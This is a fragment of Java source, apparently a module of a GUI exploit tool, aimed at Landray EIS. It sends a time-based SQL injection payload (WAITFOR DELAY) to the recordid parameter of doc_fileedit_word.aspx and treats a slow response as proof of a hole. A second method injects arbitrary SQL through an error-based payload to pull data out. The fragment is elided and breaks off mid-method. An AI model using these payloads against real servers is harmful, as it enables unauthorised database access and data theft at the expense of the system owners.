...
public class landray_eis_DocFileeditWord_sqli implements Exploitlnterface {
    @Override
    ...
    private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {
        try {
            ...
            long var = HttpTools_getTime.get(url + "/dossier/doc_fileedit_word.aspx?edittype=1,1&recordid=2015122918374828'%3BWAITFOR%20DELAY%20'0%3A0%3A2'%20--%20SxwK", head, "utf-8");
            if (var>3000) {
                String target_req = url + "/dossier/doc_fileedit_word.aspx?edittype=1,1&recordid=2015122918374828'%3BWAITFOR%20DELAY%20'0%3A0%3A2'%20--%20SxwK";
                Platform.runLater(() -> {
                    textArea.appendText("\n [ landray_eis_DocFileeditWord_sqli ]");
    ...
    private Boolean attcmd(String url, String sql,TextArea textArea, TextArea textArea_cmd) {
        try {
            String var =  error_sqli_get(url+"/dossier/doc_fileedit_word.aspx?edittype=1,1&recordid=2015122918374828'%20AND%207409%20IN%20(SELECT%20"+getAllEncode.getAllUrlEncode(sql,"")+")--%20gNae");
